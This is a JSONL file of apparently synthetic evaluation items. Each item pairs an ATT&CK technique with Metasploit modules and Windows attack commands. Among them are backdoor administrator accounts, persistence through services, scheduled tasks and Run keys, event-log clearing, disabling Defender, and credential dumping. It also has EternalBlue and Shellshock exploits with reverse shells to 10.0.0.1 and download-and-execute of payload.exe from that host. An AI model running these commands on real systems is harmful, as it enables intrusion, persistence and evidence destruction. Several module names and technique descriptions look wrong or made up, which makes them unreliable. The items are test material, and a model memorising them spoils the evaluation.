{"id": "msf-eval-T1569.002-001", "text": "**Technique: System Services: Service Execution (T1569.002)**\n\nCreate and start a Windows service to execute a payload.\n\n**Command (cmd):**\n```\nsc.exe create payloadsrv binPath= \"C:\\temp\\payload.exe\" start= demand\nsc.exe start payloadsrv\n```\n\n**Cleanup:**\n```\nsc.exe stop payloadsrv\nsc.exe delete payloadsrv /f\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1059.001-001", "text": "**Technique: Command and Scripting Interpreter: PowerShell (T1059.001)**\n\nExecute an encoded PowerShell command to bypass execution policy.\n\n**Command (powershell):**\n```\npowershell.exe -EncodedCommand <base64_encoded_command>\n```\n\nUseful for initial access payloads that need to bypass AMSI.", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1053.005-001", "text": "**Technique: Scheduled Task/Job: Scheduled Task (T1053.005)**\n\nCreate a scheduled task for persistence.\n\n**Command (cmd):**\n```\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\update.exe\" /sc onlogon /ru SYSTEM\n```\n\n**Cleanup:**\n```\nschtasks /delete /tn \"WindowsUpdate\" /f\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1078-001", "text": "**Technique: Valid Accounts (T1078)**\n\nAuthenticate using harvested credentials to move laterally.\n\n**Steps:**\n1. Use `psexec` module with captured credentials\n2. Deploy payload to target system\n3. Establish persistent access via scheduled task\n\n**Module:** `exploit/windows/smb/psexec`", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1055-001", "text": "**Technique: Process Injection (T1055)**\n\nInject shellcode into a running process.\n\n**Command (meterpreter):**\n```\nmigrate <PID>\n```\n\nCommon target processes: explorer.exe, svchost.exe, lsass.exe", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1046-001", "text": "**Technique: Network Service Discovery (T1046)**\n\nScan target network for open ports using auxiliary modules.\n\n**Module:** `auxiliary/scanner/portscan/tcp`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.0/24\nset PORTS 1-1024\nset THREADS 50\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1087-001", "text": "**Technique: Account Discovery (T1087)**\n\nEnumerate domain accounts via LDAP queries.\n\n**Module:** `auxiliary/gather/ldap_query`\n\n**Configuration:**\n```\nset RHOSTS dc01.corp.local\nset LDAP_QUERY (objectClass=user)\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1110.001-001", "text": "**Technique: Brute Force: Password Guessing (T1110.001)**\n\nAttempt password spraying against SMB.\n\n**Module:** `auxiliary/analyze/crack_smb`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.100\nset USER_FILE /usr/share/wordlists/users.txt\nset PASS_FILE /usr/share/wordlists/passwords.txt\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1566.001-001", "text": "**Technique: Phishing: Spearphishing Attachment (T1566.001)**\n\nGenerate a phishing payload with embedded macro.\n\n**Module:** `exploit/multi/fileformat/office_word_macro`\n\n**Configuration:**\n```\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1059.003-001", "text": "**Technique: Command and Scripting Interpreter: Windows Command Shell (T1059.003)**\n\nExecute a batch command via cmd.exe for lateral movement.\n\n**Command (cmd):**\n```\ncmd.exe /c \"net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add\"\n```\n\n**Cleanup:**\n```\nnet user backdoor /delete\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1136.001-001", "text": "**Technique: Create Account: Local Account (T1136.001)**\n\nCreate a local administrator account for persistence.\n\n**Command (cmd):**\n```\nnet user svc_backup Summer2026! /add\nnet localgroup administrators svc_backup /add\n```\n\n**Cleanup:**\n```\nnet user svc_backup /delete\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1070.001-001", "text": "**Technique: Indicator Removal: Clear Event Logs (T1070.001)**\n\nClear Windows event logs to remove evidence of compromise.\n\n**Command (cmd):**\n```\nwevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\n```\n\nNote: Log clearing generates Event ID 1102 in the Security log.", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1562.001-001", "text": "**Technique: Impair Defenses: Disable or Modify Tools (T1562.001)**\n\nDisable Windows Defender real-time protection.\n\n**Command (powershell):**\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\n**Cleanup:**\n```\nSet-MpPreference -DisableRealtimeMonitoring $false\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1018-001", "text": "**Technique: Remote System Discovery (T1018)**\n\nDiscover systems on the network using ARP scanning.\n\n**Module:** `auxiliary/scanner/discovery/arp_sweep`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.0/24\nset THREADS 10\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1547.001-001", "text": "**Technique: Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)**\n\nAdd a Run key for persistence.\n\n**Command (cmd):**\n```\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdateSvc /t REG_SZ /d \"C:\\temp\\update.exe\"\n```\n\n**Cleanup:**\n```\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdateSvc /f\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1082-001", "text": "**Technique: System Information Discovery (T1082)**\n\nGather system information via meterpreter session.\n\n**Command (meterpreter):**\n```\nsysinfo\ngetpid\ngetuid\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1003.001-001", "text": "**Technique: OS Credential Dumping: LSASS Memory (T1003.001)**\n\nDump LSASS memory for credential extraction.\n\n**Module:** `post/windows/gather/credentials/credential_collector`\n\nOr via meterpreter:\n```\nhashdump\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1098-001", "text": "**Technique: Account Manipulation (T1098)**\n\nModify an existing account to escalate privileges.\n\n**Command (cmd):**\n```\nnet user administrator NewP@ssword123\nnet localgroup administrators lowpriv /add\n```\n\n**Cleanup:**\n```\nnet localgroup administrators lowpriv /delete\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1482-001", "text": "**Technique: Domain Trust Discovery (T1482)**\n\nEnumerate domain trust relationships.\n\n**Command (cmd):**\n```\nnltest /domain_trusts\nnltest /dclist:corp.local\n```\n\nAlternative via LDAP queries for cross-domain information.", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1110.003-001", "text": "**Technique: Brute Force: Password Spraying (T1110.003)**\n\nPassword spray against multiple accounts.\n\n**Module:** `auxiliary/scanner/smb/smb_login`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.0/24\nset SMBDomain CORP\nset USER_FILE users.txt\nset PASS_SPRAY Summer2026!\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1484.001-001", "text": "**Technique: Domain Policy Modification: DCShadow (T1484.001)**\n\nInject a fake domain controller into Active Directory.\n\n**Prerequisites:** Domain admin privileges, two sessions required.\n\n**Steps:**\n1. Register the fake DC in the AD configuration\n2. Push changes via DRSUAPI\n3. Deregister the fake DC\n\nThis is a high-privilege persistence technique.", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1190-001", "text": "**Technique: Exploit Public-Facing Application (T1190)**\n\nExploit a vulnerable web application for initial access.\n\n**Module:** `exploit/multi/http/apache_mod_cgi_bash_env_exec`\n\n**Configuration:**\n```\nset RHOSTS target.example.com\nset PAYLOAD cmd/unix/reverse_bash\nset LHOST 10.0.0.1\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1210-001", "text": "**Technique: Exploitation of Remote Services (T1210)**\n\nExploit SMB vulnerability for lateral movement.\n\n**Module:** `exploit/windows/smb/ms17_010_eternalblue`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1021.001-001", "text": "**Technique: Remote Services: Remote Desktop Protocol (T1021.001)**\n\nRDP lateral movement via pass-the-hash.\n\n**Module:** `exploit/windows/rdp/rdp_double_hop`\n\n**Configuration:**\n```\nset RHOSTS 192.168.1.60\nset SMBDomain CORP\nset SMBUser administrator\nset SMBPass aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nrun\n```", "source": "metasploit-synthetic"}
{"id": "msf-eval-T1105-001", "text": "**Technique: Ingress Tool Transfer (T1105)**\n\nDownload and execute a payload from a remote server.\n\n**Command (powershell):**\n```\nInvoke-WebRequest -Uri http://10.0.0.1/payload.exe -OutFile C:\\temp\\payload.exe\nC:\\temp\\payload.exe\n```\n\nAlternative via certutil:\n```\ncertutil -urlcache -split -f http://10.0.0.1/payload.exe C:\\temp\\payload.exe\n```", "source": "metasploit-synthetic"}